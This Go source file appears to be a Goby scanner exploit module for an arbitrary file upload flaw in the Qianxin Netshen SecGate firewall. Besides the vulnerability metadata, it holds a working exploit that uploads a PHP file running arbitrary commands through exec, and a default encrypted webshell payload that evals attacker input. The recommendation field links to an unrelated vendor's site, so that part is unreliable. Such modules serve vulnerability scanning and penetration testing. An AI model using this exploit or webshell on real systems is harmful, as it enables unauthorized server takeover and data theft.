package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Qianxin Netshen Firewall System Front Desk/?g=sys_hand_upfile Command Execution Vulnerability",
    "Description": "<p>The application has an arbitrary file upload interface /?g=sys_hand_upfile in the foreground, which can construct a request package and upload a webshell file to control the server.</p><p>Qi'anxin Netshen's new generation smart firewall is an innovative firewall product that can comprehensively respond to traditional network attacks and advanced threats.</p>",
    "Product": "legendsec-Firewall",
    "Homepage": "https://www.legendsec.com/",
    "DisclosureDate": "2022-12-07",
    "PostTime": "2024-03-28",
    "Author": "兰公子",
    "FofaQuery": "title=\"网神SecGate 3600防火墙\"",
    "GobyQuery": "title=\"网神SecGate 3600防火墙\"",
    "Level": "3",
    "Impact": "<p>There is an arbitrary file upload vulnerability in Qi'anxin Netshen's new generation smart firewall. An attacker may be able to use this vulnerability to upload malicious files and execute arbitrary code, thereby causing unauthorized access to the system, data leakage, or system crash.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.example.com\">https://www.sierrawireless.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "choose",
            "type": "select",
            "value": "command,upload",
            "show": ""
        },
        {
            "name": "command",
            "type": "input",
            "value": "whoami",
            "show": "choose=command"
        },
        {
            "name": "upload",
            "type": "input",
            "value": "<?php @error_reporting(0); session_start();     $key=\"e45e329feb5d925b\"; \t$_SESSION['k']=$key; \tsession_write_close(); \t$post=file_get_contents(\"php://input\"); \tif(!extension_loaded('openssl')) \t{ \t\t$t=\"base64_\".\"decode\"; \t\t$post=$t($post.\"\"); \t\t \t\tfor($i=0;$i<strlen($post);$i++) {     \t\t\t $post[$i] = $post[$i]^$key[$i+1&15];      \t\t\t} \t} \telse \t{ \t\t$post=openssl_decrypt($post, \"AES128\", $key); \t}     $arr=explode('|',$post);     $func=$arr[0];     $params=$arr[1]; \tclass C{public function __invoke($p) {eval($p.\"\");}}     @call_user_func(new C(),$params); ?>",
            "show": "choose=upload"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/?g=sys_hand_upfile",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n10000000\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"upfile\"; filename=\"test.php\"\nContent-Type: text/plain\n\n<?php @error_reporting(0);echo \"test\";unlink(__FILE__);?>\n\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"submit_post\"\n\nsys_hand_upfile\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"__hash__\"\n\n0b9d6b1ab7479ab69d9f71b05e0e9445\n------WebKitFormBoundaryJpMyThWnAxbcBBQc—\n"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0b9d6b1ab7479ab69d9f71b05e0e9445",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/?g=sys_hand_upfile"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/attachements/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "HW-2023"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.2",
    "Translation": {
        "CN": {
            "Name": "奇安信网神防火墙系统前台 /?g=sys_hand_upfile 命令执行漏洞",
            "Product": "网神-防火墙",
            "Description": "<p>奇安信网神新一代智慧防火墙是一款能够全面应对传统网络攻击和高级威胁的创新型防火墙产品。</p><p>该应用存在前台的任意文件上传接口/?g=sys_hand_upfile，可构造请求包命令执行，上传webshell文件从而控制服务器。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://www.example.com\" target=\"_blank\">https://www.sierrawireless.com/</a></p>",
            "Impact": "<p>奇安信网神新一代智慧防火墙存在任意文件上传漏洞，攻击者可能能够利用该漏洞上传恶意文件并执行任意代码，从而对系统进行未授权访问、数据泄露或者系统崩溃等危害。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Qianxin Netshen Firewall System Front Desk/?g=sys_hand_upfile Command Execution Vulnerability",
            "Product": "legendsec-Firewall",
            "Description": "<p>The application has an arbitrary file upload interface /?g=sys_hand_upfile in the foreground, which can construct a request package and upload a webshell file to control the server.</p><p>Qi'anxin Netshen's new generation smart firewall is an innovative firewall product that can comprehensively respond to traditional network attacks and advanced threats.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<br><a href=\"http://www.example.com\" target=\"_blank\">https://www.sierrawireless.com/</a></p>",
            "Impact": "<p>There is an arbitrary file upload vulnerability in Qi'anxin Netshen's new generation smart firewall. An attacker may be able to use this vulnerability to upload malicious files and execute arbitrary code, thereby causing unauthorized access to the system, data leakage, or system crash.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	//随机生成文件
	makeFileNamedsFSa := func(fileType string) string {
		fileName := goutils.RandomHexString(16) + "." + fileType
		return fileName
	}

	//GET请求构造(请求url)
	sendPayloadFlagGetdsFSa := func(hostInfo *httpclient.FixUrl, urlOfGet string, getHeaderMap map[string]string) (*httpclient.HttpResponse, error) {
		getRequestConfigdsFSa := httpclient.NewGetRequestConfig(urlOfGet)
		getRequestConfigdsFSa.VerifyTls = false
		getRequestConfigdsFSa.FollowRedirect = false
		for postHeaderKey, postHeaderValue := range getHeaderMap {
			getRequestConfigdsFSa.Header.Store(postHeaderKey, postHeaderValue)
		}
		return httpclient.DoHttpRequest(hostInfo, getRequestConfigdsFSa)
	}

	//POST请求构造(请求url , data参数 , header参数(map))
	sendPayloadFlagPostdsFSa := func(hostInfo *httpclient.FixUrl, urlOfPost string, dataOfPost string, postHeaderMap map[string]string) (*httpclient.HttpResponse, error) {
		postRequestConfigdsFSa := httpclient.NewPostRequestConfig(urlOfPost)
		postRequestConfigdsFSa.VerifyTls = false
		postRequestConfigdsFSa.FollowRedirect = false
		for postHeaderKey, postHeaderValue := range postHeaderMap {
			postRequestConfigdsFSa.Header.Store(postHeaderKey, postHeaderValue)
		}
		postRequestConfigdsFSa.Data = dataOfPost
		return httpclient.DoHttpRequest(hostInfo, postRequestConfigdsFSa)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			choose := goutils.B2S(ss.Params["choose"])
			var finishcommand string
			var commondtxt string
			if choose == "command" {
				commondtxt = goutils.B2S(ss.Params["command"])
				finishcommand = `<?$result = exec("` + commondtxt + `", $outcome, $status); var_dump($outcome);?>`
			} else {
				finishcommand = goutils.B2S(ss.Params["upload"])
			}
			fileName := makeFileNamedsFSa("php")
			postFirstResultOfMap := map[string]string{"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc"}
			_, err := sendPayloadFlagPostdsFSa(expResult.HostInfo, "/?g=sys_hand_upfile", `------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="upfile"; filename="`+fileName+`"
Content-Type: text/plain

`+finishcommand+`

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

sys_hand_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc—`, postFirstResultOfMap)
			if err != nil {
				expResult.Output = "漏洞利用失败"
				return expResult
			}

			if choose == "command" {
				getSecResultOfMap := map[string]string{}
				commandResultOfGetGHsaf, err := sendPayloadFlagGetdsFSa(expResult.HostInfo, "/attachements/"+fileName, getSecResultOfMap)
				if err != nil {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output += "命令执行成功：\n" + commandResultOfGetGHsaf.Utf8Html
				return expResult
			} else {
				expResult.Success = true
				expResult.Output += "文件上传成功：\nFile URL: " + expResult.HostInfo.FixedHostInfo + "/attachements/" + fileName
				return expResult
			}
		},
	))
}
